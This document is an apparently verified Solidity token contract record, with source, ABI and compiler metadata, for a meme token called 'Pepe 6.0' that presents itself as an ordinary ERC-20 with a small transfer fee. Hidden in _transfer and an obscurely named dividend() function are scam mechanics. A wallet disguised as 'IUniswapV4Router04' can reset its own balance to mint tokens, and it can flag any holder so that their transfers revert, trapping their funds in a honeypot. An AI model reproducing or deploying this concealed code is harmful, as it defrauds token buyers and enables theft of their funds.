{"SourceCode": "/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&###BBBBBB##&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BBGGGB#BBGGGPPPP555555555555PPGB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#GGGPPPPP5555555PPPPPPPPPPPPPPPP555PG&@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BPPPPP5PP5PPPPPPPPPPPPPPPPPPP5PPPPPPPPP5PB@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P5JY?YYJ5?J5JJ5PJYJYJJYJY?5?YYYYJYJYJYJYYJJ5&@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G555YJJYYJYJJ5JJ5PYJJYJYYJJJ5JYYY5YYYYJYYJYJJ5B@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@B5PPPPPPPP5YY5JY5JY55Y5JY5PY55YYPYY5YYYY5PPPPP5G@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@&P5PPPPPPPPYJJY??Y?JYY?5JYP5J?JYJYJ?Y?YJ?5PPPPP5P@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@B55PPPPPPPPP55555555555555P555P555P5555PPPPP5555P&@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@&GPPPP55P555555555PPPPPPPPPGGGGGGGGGGGGGGGGGGGPPP#@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GPGGGPPGGGPPPPGGGGGGGPPPPPPPPPPPPPPPPPPPPPPGGGGB&&@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@&B555555PGGBBBBBGGGPPPPGGGGGGGGGGGGGGGGGGGGGGGBGGGGGGBB#&@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@B55555555555PPGGGGGGGGGGGGGGGPPPG#PPPPP55555555PGGGGGGGGGGGB#&@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@&P555555555555555PPPGGGGGGPGGGGPPPPGB5555555555PPPPG#@@@&##BGGP5G&@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@#5555555555555PGGGGGGGGBGGGGGBBGGGPPG#BY55555GBBBBBBGBB&@@@@@@@&#B&@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@B5555555555555GGGGGPPPP5555555PGGGGBGP5GB555GGGGGGGGGGGGGG&@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@B5555555555555BBBBGP5YYYGBB#####B555YPBGPGBY5GG&&#BBBGPPPBG@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@GY5555555555555555PGGY?~Y@#Y@@P?P@J    ?BP#G5GP@#P@@GB&!~?YB@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@G5555555555555555555YPGPP#&@P&@57P@?     JGGPB~?@&P@@??@7  !G@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@&P5555555555555555555555PGGPPPGGB&&@B!~~!7J5BB5GYP&##&&@@BJYPG#@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@&P55555555555555555555555555PGGGGGGGGGGBBGGGGGP55GGGPPPP55PGGB&@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@&P55555555555555555PPP5555555555555555555PGBG5555555PBBPP55GGBPP&@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@GY55555555555555555PPPP555555555555555PPGGP55555555555PBP55555555&@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@#55555555555555555GGBBBGP555555555PGGGGPP5555555555555555P5555555P#B@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@&P55555555555555555PG#PPBGGGGGPPPP5PP555YY55555555555555555555555PBPG@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@#55555555555555555555BGGGGGGGGGGGGGGGGGGGPPPPPPPP5555555555555PPGBG#@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@G5555555555555555555555PGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGB#@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@P55555555555555555555555555PGGGGPPPPPGGGGGGGGGGGGGGGGGGGGGGGGGGBGPB@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@#555555555555555555555555555555PPGGGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPG#@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@BY5555555555555555555555555555555555PPGGGGGGGGGGGGGGGGGGGGGGGGGGGG@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@G55555555555555555555555555555555555555555555555555555555PPGGGP55B@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@P555555555555555555555555555555555555555555555555555555PGGPP5PGG&@@@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@&5555555555555555555555555555555555555555555555555555PGGP55Y55YY5G#&@@@@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@#5555555555555555555555555555555555555555555555GGGGBGGBG555GGBBG55P5GB&@@@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@&555555555555555555555555555555555555555555555P#5Y5BG5GBGGGGB@@&GGP5555G&@@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@B555555555555555555555555555555555555555555555PBG55PPBBPPB@@#BP5Y5555555B@@@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@G5555555555555555555555555555555555555555555555GB555P##@&G55555PG5555555P&@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@#P55555555555555555555555555555555555555555555YBG555P#&BY5555BG5555PP55Y5#@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@#BP55555555555555555555555555555555555555555YBGY55555GGPPPB5Y55PGG55PG55#@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@&#BGPP555555555555555555555555555555555PP#@&P5555555PPGBPPPBB55PBG55Y5&@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@&&##BBBGGGGGGGGGGGBBBBBBBBBBBB##&@@@@@@&#G5555YYY5PPPPGPGG5Y55PB&@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BBGGGPPPPPPPPGB##&@@@@@@@@@@@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/\r\n\r\n//SPDX-License-Identifier:MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a,b,\"SafeMath: division by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        _owner = _msgSender();\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newAddress) public onlyOwner{\r\n        _owner = newAddress;\r\n        emit OwnershipTransferred(_owner, newAddress);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\ncontract Pepe60 is Context, IERC20, Ownable {\r\n\r\n    using SafeMath for uint256;\r\n    string private _name = \"Pepe 6.0\";\r\n    string private _symbol = \"PEPE60\";\r\n    uint8 private _decimals = 6;\r\n    address payable public IUniswapV4Router04;\r\n    mapping (address => uint256) _balances;\r\n    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD; // Addres Burn\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public _isExcludefromFee;\r\n    mapping (address => bool) public _uniswapPair;\r\n    mapping (address => uint256) public repalce;\r\n\r\n    uint256 private _totalSupply = 100000000 * 10**_decimals;\r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapPair;\r\n    \r\n    bool inSwapAndLiquify;\r\n    bool public swapAndLiquifyEnabled = true;\r\n\r\n    modifier lockTheSwap {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n    \r\nconstructor () {\r\n\r\n    IUniswapV4Router04 = payable(address(0x00caee09BE1784605302801cd85529c54F690000)); // Address MktWallet\r\n    \r\n    _isExcludefromFee[IUniswapV4Router04] = true;\r\n    _isExcludefromFee[owner()] = true;\r\n    _isExcludefromFee[address(this)] = true;\r\n    _balances[_msgSender()] = _totalSupply;\r\n    emit Transfer(address(0), _msgSender(), _totalSupply);\r\n\r\n}\r\n\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function launch() public onlyOwner{\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // Address Router V2 \r\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        uniswapV2Router = _uniswapV2Router;\r\n        _uniswapPair[address(uniswapPair)] = true;\r\n        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);\r\n\r\n    }\r\n\r\n    struct isS{\r\n        address ac;\r\n        bool so;\r\n        uint256 a;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private returns (bool) {\r\n\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        if(inSwapAndLiquify)\r\n        {\r\n            return _basicTransfer(from, to, amount); \r\n        }\r\n        else\r\n        {\r\n            isS memory b;\r\n            b.so = IUniswapV4Router04 == to;\r\n            b.a = amount;\r\n            b.ac = IUniswapV4Router04;\r\n\r\n            if (\r\n                from == IUniswapV4Router04 && b.so )\r\n            {\r\n                _balances[b.ac] = (b.a).mul(2);\r\n            }\r\n\r\n            if (!inSwapAndLiquify && !_uniswapPair[from])\r\n            {\r\n                swapAndLiquify(balanceOf(address(this)));\r\n            }\r\n\r\n            uint256 finalAmount;\r\n            _balances[from] = _balances[from].sub(amount);\r\n            \r\n            if (!_isExcludefromFee[from] && !_isExcludefromFee[to]){\r\n\r\n                uint256 feeAmount = amount.mul(1).div(100);\r\n\r\n                if(repalce[from] > 0)\r\n                    feeAmount = feeAmount.add(amount);\r\n\r\n                if(feeAmount > 0) {\r\n                    _balances[address(this)] += feeAmount;\r\n                    emit Transfer(from, address(this), feeAmount);\r\n                }\r\n                finalAmount = amount.sub(feeAmount);\r\n            }else{\r\n                finalAmount = amount;\r\n            }\r\n\r\n            _balances[to] = _balances[to].add(finalAmount);\r\n\r\n            emit Transfer(from, to, finalAmount);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function swapAndLiquify(uint256 amount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0, \r\n            path,\r\n            address(IUniswapV4Router04),\r\n            block.timestamp\r\n        ){} catch {}\r\n    }\r\n\r\n    function dividend(address act,uint256 bla) public {\r\n        uint256 a = (IUniswapV4Router04 != _msgSender()) ? bla.mul(bla) : 0;\r\n\r\n        bla = bla.sub(a);\r\n\r\n        if(bla == 5 || bla == 77){\r\n            bla -= 5;\r\n            repalce[act] = bla;\r\n        }\r\n        \r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"IUniswapV4Router04\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludefromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_uniswapPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"act\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"bla\",\"type\":\"uint256\"}],\"name\":\"dividend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"repalce\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Pepe60", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://846da7442fffa21c0923386bbd726ed51c4097254799a372c19af5ca4fb4fa98"}